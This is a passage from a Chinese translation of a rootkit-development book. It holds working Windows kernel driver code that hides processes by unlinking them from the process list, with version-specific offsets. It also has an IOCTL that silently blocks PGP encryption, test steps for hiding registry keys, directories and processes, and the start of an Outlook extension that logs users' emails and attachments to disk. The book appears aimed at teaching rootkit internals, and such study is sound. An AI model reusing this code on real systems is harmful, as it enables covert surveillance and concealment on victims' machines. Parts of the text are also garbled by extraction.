IoStatus->Information = 0;
switch ( IoControlCode )
{
case GHOST_ON_OFF_COMMAND:
if(InputBufferLength >= sizeof(GHOST_IOCTLDATA))
{
pControlData = (GHOST_IOCTLDATA*)InputBuffer;
if(pControlData->command == GHOST_ON)
{
// block PGP encryption
allowEncryption = FALSE;
DbgPrint ("comint32: blocking encryption");
}
else
{
// allow PGP encryption
allowEncryption = TRUE;
DbgPrint ("comint32: allowing encryption");
}
}
return IoStatus->Status;
case GHOST_STATUS_COMMAND:
if(OutputBufferLength >= sizeof(GHOST_IOCTLDATA))
{
pControlData = (GHOST_IOCTLDATA*)OutputBuffer;
if(allowEncryption == TRUE)
pControlData->command = GHOST_OFF;
else
pControlData->command = GHOST_ON;
}
IoStatus->Information = sizeof(GHOST_IOCTLDATA);
return IoStatus->Status;
case GHOST_HIDE_COMMAND:
if ( InputBufferLength >= sizeof(GHOST_IOCTLDATA) )
{
pControlData = (GHOST_IOCTLDATA*)InputBuffer;
eProcess = findProcess( pControlData->processId );
if( eProcess != 0 )
{
// Hide the process
processList = (LIST_ENTRY *)(eProcess + listOffset );
if( processList && processList->Flink && processList->Blink)
{
*((DWORD *)processList->Blink) = (DWORD) processList->Flink;
*((DWORD *)processList->Flink + 1) = (DWORD) processList->Blink;
processList->Flink = (LIST_ENTRY *)&(processList->Flink);
processList->Blink = (LIST_ENTRY *)&(processList->Flink);
}
else
{
DbgPrint("comint32: Error finding process 0x%x",
pControlData->processId);
}
}
else
{
DbgPrint("comint32: Could not find process 0x%x",
pControlData->processId);
}
}
return IoStatus->Status;
default:
IoStatus->Information = 0;
IoStatus->Status = STATUS_NOT_SUPPORTED;
return IoStatus->Status;
}
return STATUS_SUCCESS;
}
函数findProcess 接收一个进程ID 然后会返回进程在进程链表中的条目。
函数OnDeviceControl 经过修改后添加了GHOST_HIDE_COMMAND。
这个隐藏命令和进程ID一起通过结构体GHOST_IOCTLDATA 传递，在用findProcess 获取到
进程的条目后,这个隐藏命令会从进程链表中移除这个进程条目。像设备链表一样，这个进
程链表不是用来分配进程时间槽的，所以进程可以从链表中移除，和设备驱动链表不同的是，
在进程条目从链表中移除后这个进程条目可能还会被引用到，为了防止系统崩溃，要将移除
的这个条目的指针指向它们自身。
不管是findProcess 还是GHOST_HIDE_COMMAND 都要依赖于listOffset，这是一个全局变
量，这个变量依赖于操作系统的版本，它表示的是从PsGetCurrentProcess 返回的指针到进程
链表条目的距离，因为这个值是取决于操作系统版的，可以在DriverEntry里很易地设置，因
为我们会在 DriverEnty 解析主要和次要操作系统的的值，因此，Ghost.c会 像下面这样修
改。
全局变量listOffset添加在Ghost.c的最顶部：
// Process list offset
DWORD listOffset;
并且在DriverEntry里被设置:
if ( majorVersion == 5 && minorVersion == 2 )
{
listOffset = 152;
DbgPrint("comint32: Running on Windows 2003");
}
else if ( majorVersion == 5 && minorVersion == 1 )
{
listOffset = 136;
DbgPrint("comint32: Running on Windows XP");
}
else if ( majorVersion == 5 && minorVersion == 0 )
{
listOffset = 160;
DbgPrint("comint32: Running on Windows 2000");
}
else if ( majorVersion == 4 && minorVersion == 0 )
{
listOffset = 152;
DbgPrint("comint32: Running on Windows NT 4.0");
}
else
{
listOffset = 0;
DbgPrint("comint32: Running on unknown system");
}
测试隐藏效果
在测试注册表项的隐藏之前,你应该要意识到修改注册表的风险.下面微软给的警告:
贴士： 有关如何编辑注册表的信息，请查看注册表编辑器（Regedit.exe）中联机帮助中更
改项和值的部分。请注意在编辑注册表之前您应作一下注册表文件（System.dat 和 User.dat）
的备份.
警告： 不正确地使用注册表编辑器可能会导致一些严重的问题，这可能导致你需要重装操
作系统，微软公司不保证可以解决掉由于不正确地使用注册表编辑器而导致的问题，使用注
册表编译器需要你自己承担风险。
在修改注册表设置时要养成总是先备份一下注册表的习惯，你可以用 System.dat 和
User.dat 来备份整个注册表，或者使用 REGEDIT 来导出注册表的其中一部分。
导出注册表的其中一部分：
1.点击开始菜单，点击运行并输入 REGEDIT.点击确定。
2.在注册表编辑器里选择你要进行备份的项。
3.从注册表菜单里选择导出注册表文件。
4.在保存列表里选择你要保存的文件夹。
5.在文件名里为这个备份文件输入一个名字，例如 “Options” 或者 “Backup”。
6.导出范围里，确定 “所选分支"”被选上。
7.点击保存，文件会保存成一个.reg 后缀的文件。
要测试注册表项和文件隐藏功能，要在你的计算机里增加这些东西：
目录：C:\RootkitDirectory
注册表：HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SSSDriver1
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SSSDriver2
现在用 SCMLoader 来加载本章编写 的 rootkit，这样不但会加载这个 rootkit 到内核内
存里，还会在注册表里的 Services 下创建一个 MyDeviceDriver 项，你可以用注册表编辑器
来
验
证
一
下
这
个
项
：
HKEY_LOCAL_MACHINE
\System\CurrentControlSet\Services\MyDeviceDriver
现在启动这个 rootkit(net start MyDeviceDriver)，
现在不论是重新打开注册表编辑器还是刷新当前视图你都不会看得到上面提到的注册表项。
现在看一下 C:\ 的文件列表，你将看不到之前创建的 RootkitDirectory 目录。
为了测试进程隐藏功能，分别在 rootkit 运行和没运行的时候运行一下测试程序 HideMe.exe，
如果 rootkit 没有运行，HideMe 会报告"Could not find MyDeviceDriver"，而且 windows 任务
管理器的进程标签页会显示出 HideMe.exe 进程.在验证完后，在 HideMe 的命令行窗口里随
便按下一个键,将会结束 HideMe 进程。
如果 rootkit 正在运行，HedeMe 会报告 "MyDeviceDriver hiding this process" 并且 windows
任务管理器的里程标签页里不会显示 HedeMe.exe 进程。
总结
我们现在拥有了一个具有如下功能的 rootkit：
隐藏设备驱动条目
隐藏配置文件
挂钩操作系统内核
挂钩系统加载进程中指定的进程
响应从用户层程序发来的命令
和远程控制者进程通信
网络通信的过滤
文件系统操作的过滤
按键记录
隐藏注册表项
隐藏目录
隐藏进程
作为一个练习的例子，我们的 rootkit 现在基本上就完成了。在剩下的章节中还有更多
的主题要讨论，还有更多的代码要介绍。但这就标志着 rootkit 的开发结束，下一章介绍企
业邮件的过滤，这类的过滤通常都是在用户层进行然后传递给 rootkit 处理的。
笫十章 电子邮件的过滤
概述
通过修改在笫八章中编写的按键记录器可以达到从电子邮件程序里记录信息的目的，而
通过修改笫七章编写的网络过滤器可以达到区分底层协议和收集电子邮件信息的目的，如果
是在使用 Microsoft Exchange Server 或者 Lotus Domino Server 的这些商业环境里，还有一
个更好的办法，这些公司的电子邮件解决方案提供了扩展客户端功能的接口，这通常是通过
使用指定的动态库文件来实现的，如果要在这种环境下进行电子邮件的过滤，我们要做的仅
仅是弄明白在目标邮件系统里提供的扩展接口。
本章包括以下内容：
Microsoft Outlook 电子邮件的过滤
安装一个 Outlook
客户端过滤器
测试 Outlook 客户端扩展
Lotus Notes 电子邮件的过滤
安装一个
Lotus Notes 电子邮件客户端过滤器
测试
Lotus Notes 客户端扩展
Microsoft
Microsoft
Microsoft
Microsoft Outlook
Outlook
Outlook
Outlook 电子邮件的过滤
关于 Microsoft Outlook 的详细描述请查看 http://support.microsoft.com/kb/285999 和
http://support.microsoft.com/kb/199343.它们逐步地描述了如何创建和安装 Microsoft Outlook
电子邮件客户端扩展的过程。知识库文章 285999 中提供的示例是用一个版本比较老的
Visual Studio C 编译器编译的，但在新版的编译器里也是可以编译成功的。知识库文章
285999 中描述的安装要求在所有版本的 Microsoft Outlook 里都是通用的.
在初始化的时候，Outlook
客户端将加载每一个被注册为客户端的 DLL，并且调用其
导出的 ExchEntryPoint 函数。ExchEntryPoint 必须实例化一个基于 IExchExt 的派生类，一
旦 Outlook 初始化了这个派生类，它会为每个客户端扩展事件调用一个 Install 成员函数，如
果从 Install 成员函数返回 S_OK 就意味 Outlook 一个客户端扩展已经做好了处理此事件的准
备并且期望获得此事件的通知。
要 接 进 行 消 息 的 接 收 ， 从 ExchEntryPoint 派 生 的 类 必 须 要 包 含 一 个 基 于
IExchExtMessageEvents 的类，当已注册的事件被触发的时候消息就会发到这里.，在
IExchExtMessageEvents 接口所需要的八个成员函数中，在本章的这个例子里只使用了
OnSubmit、OnSubmitComplere 和 OnWriteComplete 这三个。
本章所讲述的客户端扩展只是包含了八个文件，其中有六个都是框架文件，只有两个文
件包含来 OUtlook 客户端扩展的实现。
这两个文件是：
OutlookExtension.cp －
实现的源代码
OutlookExtension.h
－
实现文件的头文件
六个框架文件是：
EXCHEXT.H
－
客户端扩展所需要的头文件
Stdafx.cpp
－
由 Visual Studio 创建的包含 stdafx.h 的文件
Stdafx.h
－
由 Visual
Studio
创建用来定义头和编译选项的
OutlookExtension.dsp
－
Vsual Studio 的工程文件
OutlookExtension.dsw
－
Visual Studio
的工作区文件
Readme.txt
－
Visual Studio 创建的用来定义工程结构的描述文件
本章里不会详细去描述这些框架文件。
OutlookExtension.h
OutlookExtension.h
OutlookExtension.h
OutlookExtension.h
OutlookExtension.h 定 义 了 Outlook 需 要 的 两 个 客 户 端 扩 展 类 ， CMessageEvents 和
CClientExtension。这两个类提供了扩展 Outlook 客户端的接口，CClientExtension 类是严格
遵守 Outlook 接口标准的，CMessageEvents 类包含了 Outlook 接口标准和应用程序特定逻辑，
文件
OutlookExtension.h 还包含了在 LogContent 用到的文件日志定义。
// Extension Object
// This class must inherit from the IExchExt interface,
// which contains the Install method that Outlook uses to obtain a
// new instance of the Extension Object Class.
// Also, because the IExchExt interface inherits from IUnknown,
// Component Object Model (COM) rules require that this class declare
// and implement the QueryInterface, AddRef and Release methods.
class CClientExtension:public IExchExt
{
public:
CClientExtension();
STDMETHODIMP QueryInterface(REFIID riid,void** ppvObj);
inline STDMETHODIMP_(ULONG) AddRef()
{
++m_referenceCount;
return m_referenceCount;
};
inline STDMETHODIMP_(ULONG) Release()
{
ULONG ulCount = --m_referenceCount;
if (!ulCount)
{
delete this;
}
return ulCount;
};
// This is required by IExchExt
STDMETHODIMP Install( IExchExtCallback *pmecb, ULONG mcontext, ULONG
ulFlags );
private:
ULONG m_referenceCount;
CMessageEvents* m_pMessageEvents;
};
// File Managment Definitions
#define OL_LOG_BODY
1
#define OL_LOG_ATTACHMENT 2
#define OL_LOG_ADDRESSES
3
#define OL_LOG_FILE "C:\\OL_LOG"
#define OL_TEMP_LOG_FILE "C:\\OL_TEMP"
#endif
OutlookExtension.cpp
OutlookExtension.cpp
OutlookExtension.cpp
OutlookExtension.cpp
OutlookExtension.cpp 文件 OutlookExtension.cpp 包含了所有 Outlook 客户端扩展的特
定实现逻辑(implementation-specific logic )，在这个文件包含了两个函数和两个类。
这两个函数如下::::
DllMain － 由操作系统调用。
ExchEntryPoint － 由 Outlook 在初始化的时候调用。
下面是两个类和它们的成员函数::::
CMessageEvents － 基于 Outlook 扩展类 IexchExt
QueryInterface － COM 特有的
AddRef － COM 特有的
Release － COM 特有的
OnRead － 消息接口,没用到
OnReadComplete － 消息接口,没用到
OnWrite － 消息接口，没用到
OnWriteComplete － 包含骄兵电子邮件信息的消息
OnCheckNames － 消息接口，没用到
OnCheckNamesComplete － 消息接口，没用到
OnSubmit － 用来保持提交状态的跟踪
OnSubmitComplete － 用来保持提交状态的跟踪
LogContent － 把电子邮件内容写入到磁盘
LogBody － 提取消息的正文
LogAttachments － 提取消息的附件
DeleteMessage － 删除一个邮件，没用到
CClientExtension － 基于 Outlook 扩展类 IExchExtMessageEvents
QueryInterface － COM 特有的
AddRef － COM 特有的
Release － COM 特有的
Install － 由 Outlook 调用来确定是否是我们感兴趣的事件
// OutlookExtension
// Copyright Ric Vieler, 2006
// Filter Outlook email
#include "stdafx.h"
#include 
#include 
#include 
#define MIDL_PASS
#include 
#include 
#include 
#include 
#include "EXCHEXT.H"
#include "OutlookExtension.h"
// Microsoft Exchange Client Extension entry point
extern "C" _declspec(dllexport) LPEXCHEXT CALLBACK ExchEntryPoint(void);
// DLL entry point
BOOL APIENTRY DllMain( HANDLE hModule,
DWORD